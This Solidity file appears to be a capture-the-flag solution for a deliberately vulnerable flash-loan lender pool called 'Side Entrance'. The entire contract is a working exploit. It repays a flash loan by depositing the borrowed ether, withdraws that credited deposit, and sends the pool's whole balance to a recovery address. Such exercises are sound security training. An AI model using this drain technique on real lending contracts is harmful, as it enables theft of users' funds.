// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceDrainer is IFlashLoanEtherReceiver {

    SideEntranceLenderPool private immutable pool;
    address private immutable recoveryContract;

    constructor(SideEntranceLenderPool _pool, address _recoveryContract) {
        pool = _pool;
        recoveryContract = _recoveryContract;
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    function drainPool() public {
        uint poolBalance = address(pool).balance;

        pool.flashLoan(poolBalance);

        pool.withdraw();  // We withdraw our "deposit"

        payable(recoveryContract).transfer(address(this).balance);
    }

    receive() external payable {}
}
